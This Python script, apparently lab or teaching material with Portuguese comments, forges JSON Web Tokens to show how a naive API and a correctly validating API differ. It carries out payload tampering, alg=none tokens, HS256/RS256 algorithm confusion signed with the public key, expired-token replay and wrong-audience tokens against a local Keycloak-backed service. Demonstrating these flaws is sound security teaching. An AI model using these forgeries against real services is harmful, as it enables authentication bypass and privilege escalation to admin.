"""Ataques a JWT contra as duas versões da API (ingênua e correta), usando só a biblioteca padrão.

Uso: python ataques.py <ataque>

Ataques: base, none, confusao, expirado, audience, todos
"""
import base64
import hashlib
import hmac
import json
import os
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

KEYCLOAK = os.environ["KEYCLOAK"]
API = os.environ["API"]
TOKEN_URL = f"{KEYCLOAK}/realms/lunalog/protocol/openid-connect/token"


def b64url(dados: bytes) -> str:
    return base64.urlsafe_b64encode(dados).rstrip(b"=").decode()


def b64url_decode(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def post_form(url: str, campos: dict) -> dict:
    req = urllib.request.Request(url, data=urllib.parse.urlencode(campos).encode())
    with urllib.request.urlopen(req) as r:
        return json.load(r)


def token_da_ana() -> str:
    """Um token legítimo da usuária ana (papel: operador)."""
    return post_form(TOKEN_URL, {"grant_type": "password", "client_id": "cli-teste", "username": "ana", "password": "ana-exemplo"})["access_token"]


def token_de_outro_servico() -> str:
    """Um token legítimo, mas emitido para o serviço de relatórios: o audience NÃO é a tracking-api."""
    return post_form(TOKEN_URL, {"grant_type": "client_credentials", "client_id": "relatorios", "client_secret": "relatorios-segredo-de-exemplo"})["access_token"]


def partes(token: str):
    h, p, s = token.split(".")
    return json.loads(b64url_decode(h)), json.loads(b64url_decode(p)), s


def montar(cabecalho: dict, payload: dict, assinatura: str) -> str:
    return f"{b64url(json.dumps(cabecalho, separators=(',', ':')).encode())}.{b64url(json.dumps(payload, separators=(',', ':')).encode())}.{assinatura}"


def chamar(versao: str, token: str) -> str:
    req = urllib.request.Request(f"{API}/{versao}/entregas/E-100", headers={"Authorization": f"Bearer {token}"})
    try:
        with urllib.request.urlopen(req) as r:
            corpo = json.load(r)
            return f"200 ACEITO   (autenticado_como={corpo['autenticado_como']}, papeis={corpo['papeis']})"
    except urllib.error.HTTPError as e:
        detalhe = json.load(e).get("detail", "")
        return f"{e.code} RECUSADO ({detalhe})"


def comparar(titulo: str, token: str):
    print(f"\n--- {titulo}")
    print(f"  API ingenua : {chamar('vulneravel', token)}")
    print(f"  API correta : {chamar('correto', token)}")


def ataque_base():
    legitimo = token_da_ana()
    comparar("Token legítimo da Ana", legitimo)
    cab, pay, sig = partes(legitimo)
    pay["realm_access"] = {"roles": ["admin"]}
    comparar("Token legítimo ADULTERADO (papel trocado para admin, assinatura original mantida)", montar(cab, pay, sig))


def ataque_none():
    cab, pay, _ = partes(token_da_ana())
    pay["realm_access"] = {"roles": ["admin"]}
    pay["preferred_username"] = "atacante"
    forjado = montar({"alg": "none", "typ": "JWT"}, pay, "")
    comparar("alg=none: token SEM assinatura, com papel admin", forjado)


def ataque_confusao():
    with urllib.request.urlopen(f"{API}/chave-publica.pem") as r:
        pem = r.read()  # a chave pública é pública: qualquer um baixa
    cab, pay, _ = partes(token_da_ana())
    pay["realm_access"] = {"roles": ["admin"]}
    pay["preferred_username"] = "atacante"
    pay["exp"] = int(time.time()) + 3600
    cab_forjado = {"alg": "HS256", "typ": "JWT", "kid": cab.get("kid")}
    h = b64url(json.dumps(cab_forjado, separators=(",", ":")).encode())
    p = b64url(json.dumps(pay, separators=(",", ":")).encode())
    assinatura = b64url(hmac.new(pem, f"{h}.{p}".encode(), hashlib.sha256).digest())
    comparar("Confusão de algoritmo: HS256 assinado com a chave PÚBLICA como se fosse segredo", f"{h}.{p}.{assinatura}")


def ataque_expirado(espera: int = 65):
    token = token_da_ana()
    _, pay, _ = partes(token)
    vive = pay["exp"] - int(time.time())
    comparar(f"Token recém-emitido (vale por {vive} s)", token)
    print(f"\n  ... aguardando {espera} s para o token expirar ...")
    time.sleep(espera)
    comparar("O MESMO token, depois de expirado", token)


def ataque_audience():
    comparar("Token legítimo, mas emitido para o serviço de relatórios (aud errado)", token_de_outro_servico())


ATAQUES = {
    "base": ataque_base,
    "none": ataque_none,
    "confusao": ataque_confusao,
    "expirado": ataque_expirado,
    "audience": ataque_audience,
}

if __name__ == "__main__":
    nome = sys.argv[1] if len(sys.argv) > 1 else ""
    if nome == "todos":
        for f in ATAQUES.values():
            f()
    elif nome in ATAQUES:
        ATAQUES[nome]()
    else:
        print(__doc__)
        sys.exit(1)
